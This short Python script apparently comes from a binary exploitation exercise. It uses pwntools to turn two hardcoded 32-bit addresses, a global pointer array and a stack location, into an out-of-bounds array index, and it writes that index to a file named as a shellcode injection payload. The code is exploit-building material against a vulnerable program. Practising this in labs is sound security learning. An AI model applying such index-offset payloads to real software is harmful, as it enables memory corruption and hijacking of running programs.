from pwn import *
context.arch = 'i386'
context.os = 'linux'

#ptrs address
ptrs_addr = 0x56559094
#p address
p_addr = 0xffffd08c

s_addr = (p_addr - ptrs_addr) // 4

payload = s_addr

with open("./shellcode_payload_inj_aglobal" , "w") as f:
	f.write(str(payload))

